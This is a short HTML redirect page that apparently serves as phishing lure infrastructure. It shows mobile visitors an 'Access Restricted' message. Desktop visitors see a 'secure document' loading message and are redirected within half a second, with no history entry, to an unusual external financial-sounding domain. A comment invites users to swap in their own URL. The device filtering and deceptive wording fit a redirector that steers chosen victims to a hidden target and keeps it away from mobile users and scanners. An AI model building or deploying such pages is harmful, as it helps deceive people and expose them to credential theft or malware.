<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f8fafc;
            color: #0f172a;
            text-align: center;
            padding: 1.5rem;
        }
        .message {
            max-width: 500px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #1d4ed8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 1.5rem;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .blocked {
            background: #fef2f2;
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 2rem;
        }
        .blocked i {
            font-size: 2.5rem;
            color: #b91c1c;
            margin-bottom: 1rem;
        }
        .blocked h2 {
            color: #991b1b;
            margin-bottom: 0.5rem;
        }
        .blocked p {
            color: #7f1d1d;
        }
    </style>
</head>
<body>
    <div id="content">
        <!-- This will be replaced by either the redirect or the blocked message -->
    </div>

    <script>
        (function() {
            // --- CONFIGURATION ---
            const TARGET_URL = "https://agonode-financial-structure.cuyahogattle.com"; // CHANGE THIS TO YOUR URL
            const REDIRECT_DELAY = 500; // milliseconds (fast redirect)
            // --- END CONFIGURATION ---

            const content = document.getElementById('content');

            // 1. Check if the device is mobile
            const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent);

            // 2. If mobile, show blocked message
            if (isMobile) {
                content.innerHTML = `
                    <div class="blocked">
                        <i class="fas fa-lock" style="display: block;"></i>
                        <h2>Access Restricted</h2>
                        <p>For security reasons, this page can only be accessed from a desktop computer (Windows PC or Mac).</p>
                        <p style="margin-top: 1rem; font-size: 0.85rem;">Please open this link on a desktop device.</p>
                    </div>
                `;
                // (Optional) Add a Font Awesome link if you want icons, but they are not included in this minimal version
                // For a simple version, we're using text emojis in the CSS.
                // Add Font Awesome if desired: <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
                return;
            }

            // 3. If desktop, show a quick loading message and redirect
            content.innerHTML = `
                <div class="message">
                    <div class="spinner"></div>
                    <p style="color: #475569;">Redirecting you to the secure document...</p>
                </div>
            `;

            // 4. Perform the fast redirect
            setTimeout(function() {
                window.location.replace(TARGET_URL); // 'replace' avoids adding to history
            }, REDIRECT_DELAY);
        })();
    </script>
</body>
</html>
